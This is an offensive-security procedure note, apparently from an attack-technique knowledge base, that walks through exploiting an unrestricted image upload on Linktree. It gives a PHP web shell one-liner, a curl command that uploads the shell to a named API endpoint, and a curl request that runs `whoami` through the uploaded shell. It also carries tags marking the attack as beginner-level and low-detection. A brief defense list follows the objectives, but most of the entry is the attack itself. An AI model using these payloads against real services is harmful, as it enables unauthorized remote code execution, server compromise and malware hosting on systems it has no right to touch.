---
tags:
  - unrestricted-upload
  - file-upload
  - rce
  - web
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands:
  - '[[commands/curl-upload-file]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Remote File Copy]]'
updated_at: '2025-12-14T05:32:13.329Z'
skill_level: beginner
impact_level: high
detection_risk: low
sub_techniques: []
id: 23f7c82f-98a3-4829-8c15-0178970b712a
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Remote File Copy]]'
---
# Upload-Dangerous-Files-via-Linktree-Image-Endpoint

## Summary

This procedure exploits the unrestricted file upload vulnerability in Linktree's image upload feature, which lacks proper validation of file types or extensions, allowing attackers to upload dangerous files such as PHP scripts for potential remote code execution (RCE), APK files for malware distribution, or ZIP archives for arbitrary storage.

## Description

The vulnerability arises from the absence of server-side checks on uploaded files in the image upload endpoint. Attackers with a valid Linktree account can test and exploit this by attempting to upload non-image files. Successful uploads enable code execution if the server processes PHP files or misuse the platform as file hosting. The target environment is the web-based Linktree service, requiring only authenticated access. Expected outcomes include file persistence and accessibility, potentially leading to server compromise.

## Requirements

1. Valid authenticated session on Linktree (user account)
2. Network access to the upload endpoint (standard web connectivity)
3. Malicious file prepared (e.g., PHP shell, APK binary, ZIP archive)

## Defense

Defensive measures and detection strategies:

- Implement strict MIME type and extension validation on uploads
- Scan uploaded files with antivirus/malware detection tools
- Restrict upload directories to non-executable paths and monitor for anomalous file types
- Log and alert on uploads of non-image extensions

## Objectives

1. Bypass file upload restrictions to store dangerous content
2. Achieve potential RCE via executable uploads like PHP
3. Utilize the service for unintended file storage (e.g., APK, ZIP)

## Instructions

### Step 1: Prepare Malicious File

**Context**: Create or select a test file with a dangerous extension to simulate exploitation.

No command needed; manually prepare files like a PHP file containing `<?php system($_GET['cmd']); ?>` saved as `shell.php`.

### Step 2: Authenticate and Test Upload

**Context**: Log in to Linktree and access the image upload feature to submit the file.

**Command** ([[commands/curl-upload-file]]):
```bash
curl -X POST -F "file=@shell.php" -H "Authorization: Bearer your_token" -H "Content-Type: multipart/form-data" https://linktree.com/api/upload-image
```

> This command uploads the file via the endpoint. Replace `your_token` with a valid session token. Expected output: JSON response with upload success and file URL if vulnerable.

### Step 3: Verify Upload and Access

**Context**: Check if the file is stored and accessible, testing for execution if applicable.

Use browser or curl to access the returned URL:
```bash
curl https://linktree-upload-url/shell.php?cmd=whoami
```

> If RCE is possible, this executes the command and returns output like server user details.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Remote File Copy]]

### Sub-Techniques


## Commands Used

- [[commands/curl-upload-file]]

## Tools Used


## Tags

- [[unrestricted-upload]]
- [[file-upload]]
- [[rce]]
- [[web]]
